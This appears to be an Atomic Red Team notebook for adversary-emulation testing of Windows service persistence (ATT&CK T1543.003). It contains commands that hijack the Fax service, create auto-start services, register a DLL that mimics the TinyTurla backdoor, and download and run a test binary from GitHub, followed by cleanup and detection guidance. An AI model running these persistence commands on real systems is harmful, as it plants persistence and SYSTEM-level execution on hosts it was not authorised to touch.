{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "7e52ecd2",
   "metadata": {},
   "source": "# T1543.003 - Windows Service\nAdversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002). To make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component)."
  },
  {
   "cell_type": "markdown",
   "id": "5e290fd7",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "aafd0131",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Modify Fax service to run PowerShell",
    "This test will temporarily modify the service Fax by changing the binPath to PowerShell\nand will then revert the binPath change, restoring Fax to its original state.\nUpon successful execution, cmd will modify the binpath for `Fax` to spawn powershell. Powershell will then spawn.\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsc config Fax binPath= \"C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -noexit -c \\\"write-host 'T1543.003 Test'\\\"\"\nsc start Fax\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0126e635",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "e6d4efed",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc config Fax binPath= \"C:\\WINDOWS\\system32\\fxssvc.exe\" >nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1e95e66",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ce5dcba6",
   "metadata": {},
   "source": "### Atomic Test #2 - Service Installation CMD\nDownload an executable from github and start it as a service.\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Service binary must exist on disk at specified location (#{binary_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ac023a53",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ca7553d2",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsc.exe create AtomicTestService_CMD binPath= \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\" start=auto  type=Own\nsc.exe start AtomicTestService_CMD\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9e435015",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "eddb6c27",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc.exe stop AtomicTestService_CMD >nul 2>&1\nsc.exe delete AtomicTestService_CMD >nul 2>&1\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f60523a2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ed005a1e",
   "metadata": {},
   "source": "### Atomic Test #3 - Service Installation PowerShell\nInstalls A Local Service via PowerShell.\nUpon successful execution, powershell will download `AtomicService.exe` from github. Powershell will then use `New-Service` and `Start-Service` to start service. Results will be displayed.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Service binary must exist on disk at specified location (#{binary_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a2922c4a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "a9f042d8",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nNew-Service -Name \"AtomicTestService_PowerShell\" -BinaryPathName \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\"\nStart-Service -Name \"AtomicTestService_PowerShell\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1bc358d8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "16b1e99b",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nStop-Service -Name \"AtomicTestService_PowerShell\" 2>&1 | Out-Null\ntry {(Get-WmiObject Win32_Service -filter \"name='AtomicTestService_PowerShell'\").Delete()}\ncatch {}\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9500d47",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "0b80f045",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - TinyTurla backdoor service w64time",
    "It's running Dll as service to emulate the TinyTurla backdoor\n\n[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncopy \"$PathToAtomicsFolder\\T1543.003\\bin\\w64time.dll\" %systemroot%\\system32\\\nsc create W64Time binPath= \"c:\\Windows\\System32\\svchost.exe -k TimeService\" type= share start=auto\nsc config W64Time DisplayName= \"Windows 64 Time\"\nsc description W64Time \"Maintain date and time synch on all clients and services in the network\"\nreg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /t REG_MULTI_SZ /d \"W64Time\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\w64time.dll\" /f\nsc start W64Time```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4132c055",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "42101317",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc stop W64Time\nsc.exe delete W64Time\ndel %systemroot%\\system32\\w64time.dll\nreg delete \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\" /v TimeService /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\W64Time\\Parameters\" /v ServiceDll /f```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "667d4a9e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ed84c555",
   "metadata": {},
   "source": "### Atomic Test #5 - Remote Service Installation CMD\nDownload an executable from github and start it as a service on a remote endpoint\nUpon successful execution, powershell will download `AtomicService.exe` from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: Service binary must exist on disk at specified location (#{binary_path})\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe\" -OutFile \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "687aa4da",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7a91a865",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsc.exe \\\\localhost create AtomicTestService_CMD binPath= \"PathToAtomicsFolder\\T1543.003\\bin\\AtomicService.exe\" start=auto type=Own\nsc.exe \\\\localhost start AtomicTestService_CMD\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "702ded90",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "9e4e47f9",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nsc.exe \\\\localhost stop AtomicTestService_CMD >nul 2>&1\nsc.exe \\\\localhost delete AtomicTestService_CMD >nul 2>&1```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "380f7cbf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1543.003 -TestNumbers 5 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9bb43147",
   "metadata": {},
   "source": "## Detection\nMonitor processes and command-line arguments for actions that could create or modify services. Command-line invocation of tools capable of adding or modifying services may be unusual, depending on how systems are typically used in a particular environment. Services may also be modified through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data. Remote access tools with built-in features may also interact directly with the Windows API to perform these functions outside of typical system utilities. Collect service utility execution and service binary path arguments used for analysis. Service binary paths may even be changed to execute commands or scripts.  \n\nLook for changes to service Registry entries that do not correlate with known software, patch cycles, etc. Service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Changes to the binary path and the service startup type changed from manual or disabled to automatic, if it does not typically do so, may be suspicious. Tools such as Sysinternals Autoruns may also be used to detect system service changes that could be attempts at persistence.(Citation: TechNet Autoruns)  \n\nCreation of new services may generate an alterable event (ex: Event ID 4697 and/or 7045 (Citation: Microsoft 4697 APR 2017)(Citation: Microsoft Windows Event Forwarding FEB 2018)). New, benign services may be created during installation of new software.\n\nSuspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data. Look for abnormal process call trees from known services and for execution of other commands that could relate to Discovery or other adversary techniques. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}